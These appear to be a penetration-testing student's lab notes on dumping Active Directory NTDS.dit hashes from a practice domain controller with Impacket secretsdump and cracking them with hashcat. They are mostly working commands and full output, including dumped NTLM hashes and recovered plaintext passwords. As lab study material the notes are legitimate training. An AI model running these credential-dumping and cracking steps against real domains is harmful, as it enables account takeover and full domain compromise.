#NTDS #hashcat #secretsdump  
# What is it?

- A database used to store AD data. This includes:

- User information
- Group information
- Security descriptors
- Password hashes

  

We can use secretsdump with the `-just-dc-ntlm`​ tag against the DC to perform this attack  

`secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.95.132`​

- should dump all secrets including NTDS.DIT  

To show only the NTDS.DIT:  

`secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.95.132 -just-dc-ntlm  

- should dump just NTDS.dit

Only crack nt part of hash not lm (lm:nt is format)

- copy user and full hashes to excel, use Data tab > Text to Columns > delimiter ":". Then can copy nt hash to file to use hashcat on that file

Results:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(09:52:32)──> secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.95.132 -just-dc-ntlm             ──(Sat,Jul06)─┘
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:60163dd27f6c523edea3d171b2687db4:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
MARVEL.local\SQLService:1107:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
KzhlRYzkCb:1110:aad3b435b51404eeaad3b435b51404ee:6a9067dc6d904c7b3b1429540357683f:::
hawkeye:1111:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:20b10a26527aaed298fc553866b81642:::
THEPUNISHER$:1108:aad3b435b51404eeaad3b435b51404ee:af4c18929a5251f6c038e6e45416047b:::
SPIDERMAN$:1109:aad3b435b51404eeaad3b435b51404ee:5138b9cf4ccdda28a829bfc5e69f2d36:::
[*] Cleaning up... 
```

`hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt`​ `--show`​  

- copy username and cracked passwords to a new excel tab
- use =vlookup(B1,Sheet2!A:B,2,false)​ in column C in tab 1
- This will match the hash with its cracked password in excel. Useful for engagements when there are a lot of hashes/cracked passwords
- Focus on user passwords to crack, DC passwords will likely not be cracked

Results:
```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(09:56:45)──> hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt                                 ──(Sat,Jul06)─┘
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 7800X3D 8-Core Processor, 6939/13943 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 12 digests; 11 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

64f12cddaa88057e06a81b54e73b949b:Password1                
31d6cfe0d16ae931b73c59d7e0c089c0:                         
c39f2beb3d2ec06a62cb887fb391dee0:Password2                
43460d636f269c709b20049cee36ae7a:Password1@               
920ae267e048417fcfe00f49ecbd4b33:P@$$w0rd!                
f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#           
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: ntds.txt
Time.Started.....: Sat Jul  6 09:57:03 2024 (4 secs)
Time.Estimated...: Sat Jul  6 09:57:07 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3321.6 kH/s (0.17ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 6/11 (54.55%) Digests (total), 6/11 (54.55%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 45%

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Sat Jul  6 09:57:01 2024
Stopped: Sat Jul  6 09:57:08 2024
```

```
┌─(~/Documents/PEH)───────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/0)─┐
└─(09:57:08)──> hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt --show                      1 ↵ ──(Sat,Jul06)─┘
920ae267e048417fcfe00f49ecbd4b33:P@$$w0rd!
31d6cfe0d16ae931b73c59d7e0c089c0:
64f12cddaa88057e06a81b54e73b949b:Password1
c39f2beb3d2ec06a62cb887fb391dee0:Password2
f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#
43460d636f269c709b20049cee36ae7a:Password1@
```